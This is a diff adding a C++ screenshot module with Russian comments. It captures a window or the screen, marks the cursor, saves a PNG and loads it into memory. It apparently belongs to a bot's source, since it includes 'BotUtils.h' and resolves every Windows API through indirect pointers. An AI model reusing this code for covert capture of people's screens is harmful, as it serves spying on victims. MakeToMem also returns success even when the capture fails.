@@ -1,0 +1,141 @@
+//---------------------------------------------------------------------------
+
+#include "ScreenShots.h"
+
+#include "gdiplus.h"
+
+#include "GetApi.h"
+#include "Memory.h"
+#include "Utils.h"
+#include "BotUtils.h"
+
+
+//---------------------------------------------------------------------------
+
+
+void ScreenShotDrawCursor(HDC DC, int ImgX, int ImgY, PDrawCursorInfo DrawCursor)
+{
+	// Функция отрисовывает курсор на скриншоте
+	RECT R;
+
+	int W2 = DrawCursor->PointWidth / 2;
+	int X = DrawCursor->X - ImgX;
+	int Y = DrawCursor->Y - ImgY;
+
+	R.left   = X - W2;
+	R.top    = Y - W2;
+	R.right  = X + W2;
+	R.bottom = Y + W2;
+
+    HBRUSH Brush=(HBRUSH)pCreateSolidBrush(DrawCursor->Color);
+
+    pFillRect(DC,&R, Brush);
+
+    pDeleteObject(Brush);
+
+}
+
+
+bool ScreenShot::Make(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
+					   PDrawCursorInfo DrawCursor, PWCHAR FileName)
+{
+    static const GUID png = {0x557cf406,0x1a04,0x11d3,{0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e}};
+
+	// Получаем контекст окна
+	HDC DC = (HDC)pGetWindowDC(Wnd);
+	if (DC == NULL) return false;
+
+	// Получаем границы окна
+	RECT Rect;
+    ClearStruct(Rect);
+	if (Wnd != NULL)
+		pGetWindowRect(Wnd, &Rect);
+	else
+	if (Width == 0 || Height == 0)
+	{
+		Rect.right  = (long)pGetDeviceCaps(DC, HORZRES);
+		Rect.bottom = (long)pGetDeviceCaps(DC, VERTRES);
+	}
+
+	if (Width == 0)
+		Width = Rect.right - Rect.left;
+	if (Height == 0)
+		Height = Rect.bottom - Rect.top;
+
+	// Отрисовываем окно
+	HBITMAP Bitmap = (HBITMAP)pCreateCompatibleBitmap(DC, Width, Height);
+	HDC CompDC = (HDC)pCreateCompatibleDC(DC);
+	pSelectObject(CompDC, Bitmap);
+	pBitBlt(CompDC, 0, 0, Width, Height, DC, X , Y, SRCCOPY);
+
+	// Отрисовываем курсор
+//    HCURSOR hArrow=(HCURSOR)pLoadCursorW(NULL,IDC_ARROW);
+//
+//    ICONINFO iconinfo={0};
+//    pGetIconInfo(hArrow,&iconinfo);
+//    pDrawIcon(hCompDC,SSHOT_WIDTH/2-iconinfo.xHotspot,SSHOT_HEIGHT/2-iconinfo.yHotspot,hArrow);
+//    pDeleteObject(hArrow);
+
+	// Рисуем надпись
+//    rect.top=0;
+//    rect.right=0;
+//    rect.left=SSHOT_WIDTH;
+//    rect.bottom=SSHOT_HEIGHT;
+//    pSetTextColor(hCompDC,0x0);
+//    pSetBkColor(hCompDC,0xFFFFFF);
+//    pDrawTextA(hCompDC,lpUrl,-1,&rect,DT_BOTTOM+DT_SINGLELINE+DT_CENTER);
+
+	// Отрисовываем курсор
+	if (DrawCursor != NULL)
+		ScreenShotDrawCursor(CompDC, X, Y, DrawCursor);
+
+
+	pDeleteDC(CompDC);
+
+
+    // Сохраняем картинку в файл
+
+    using namespace Gdiplus;
+    ULONG_PTR token;
+	GdiplusStartupInput input;
+
+    m_memset(&input,0,sizeof(input));
+	input.GdiplusVersion=1;
+
+	pGdiplusStartup(&token, &input,0);
+
+    GpImage hGdiImg;
+	pGdipCreateBitmapFromHBITMAP(Bitmap,NULL,(int**)&hGdiImg);
+	pGdipSaveImageToFile(*(int* *)&hGdiImg, FileName, (CLSID*)&png, NULL);
+	pGdipDisposeImage(*(int* *)&hGdiImg);
+
+	pDeleteObject(Bitmap);
+	pReleaseDC(Wnd, DC);
+
+	pGdiplusShutdown(token);
+	return true;
+}
+//---------------------------------------------------------------------------
+
+bool ScreenShot::MakeToMem(HWND Wnd, int X, int Y, DWORD Width, DWORD Height,
+						   PDrawCursorInfo DrawCursor, LPBYTE &OutData, DWORD &OutDataSize)
+{
+	OutData = NULL;
+    OutDataSize = 0;
+
+	PWCHAR FileName = GetTempName();
+	if (FileName == NULL) return false;
+
+	// Делаем снимок
+	bool Result = Make(Wnd, X, Y, Width, Height, DrawCursor, FileName);
+	if (Result)
+	{
+		OutData = File::ReadToBufferW(FileName, OutDataSize);
+		Result = OutDataSize != 0;
+    }
+
+	// Удаляем временный файл
+    pDeleteFileW(FileName);
+	MemFree(FileName);
+	return true;
+}
